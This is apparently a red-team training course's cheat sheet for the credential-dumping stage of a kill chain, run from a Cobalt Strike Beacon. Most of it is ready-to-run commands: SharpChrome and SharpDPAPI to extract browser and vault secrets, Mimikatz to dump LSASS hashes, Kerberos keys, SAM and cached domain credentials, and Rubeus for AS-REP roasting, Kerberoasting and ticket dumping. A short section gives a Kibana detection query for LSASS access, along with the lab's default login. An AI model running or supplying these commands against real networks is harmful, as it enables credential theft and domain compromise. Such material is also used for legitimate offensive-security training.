# Kill Chain - Dumping

From the medium-integrity Beacon, read the credentials from Chrome's database.

```batch
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

## Windows Credential Manager <a href="#windows-credential-manager" id="windows-credential-manager"></a>

1.  From the medium-integrity Beacon, enumerate the vault.

    ```batch
    execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
    ```
2.  Decrypt the credentials using RPC to fetch the DPAPI key.

    ```batch
    execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
    ```

## OS Credentials <a href="#os-credentials" id="os-credentials"></a>

Mimikatz is quite a large binary so staging it across DNS can be slow. Use the DNS Beacon running as SYSTEM to spawn a new HTTP Beacon (which allows for much quicker data transfers).

1. spawn x64 http

Then from the new HTTP Beacon running as SYSTEM:

### LSASS Memory <a href="#lsass-memory" id="lsass-memory"></a>

1. Dump NTLM hashes.
   1. `mimikatz sekurlsa::logonpasswords`

### Kerberos Keys <a href="#kerberos-keys" id="kerberos-keys"></a>

1. Dump Kerberos encryption keys.
   1. `mimikatz sekurlsa::ekeys`

### Security Account Manager <a href="#security-account-manager" id="security-account-manager"></a>

1. Dump SAM database.
   1. `mimikatz lsadump::sam`

### Cached Domain Credentials <a href="#cached-domain-credentials" id="cached-domain-credentials"></a>

1. Dump the cached domain logon credentials.
   1. `mimikatz lsadump::cache`

&#x20;

## Elastic <a href="#elastic" id="elastic"></a>

1. Switch to [Kibana](https://labclient.labondemand.com/Instructions/dd029e7a-1af0-4fc4-b877-b70219752eb5) and sign in.
2. Browse to https://lon-elk-1:5601.
3. Log in with elastic : elastic.
4. Expand the menu on the left (the icon with the three horizontal lines).
5. Under **Analytics**, click **Discover**.
6.  In the search box at the top of the page, run the following query:

    ```kql-nocolor
    KQLTypeCopyevent.code: "10" and winlog.event_data.TargetImage: "C:\\Windows\\system32\\lsass.exe"
    ```
7. Review the events that appear.

## Kerberos Tickets <a href="#kerberos-tickets" id="kerberos-tickets"></a>

### AS-REP Roasting <a href="#as-rep-roasting" id="as-rep-roasting"></a>

1.  From the medium-integrity Beacon, use Rubeus to AS-REP roast every account that does not have pre-authentication enabled.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
    ```

### Kerberoasting <a href="#kerberoasting" id="kerberoasting"></a>

1.  From the medium-integrity Beacon, use Rubeus to Kerberoast every user account that has an SPN set.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
    ```

### Dumping Tickets <a href="#dumping-tickets" id="dumping-tickets"></a>

1.  From the high-integrity Beacon, use Rubeus to triage Kerberos tickets for all users.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
    ```
2.  Use Rubeus to dump the TGT for rsteel.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap
    ```
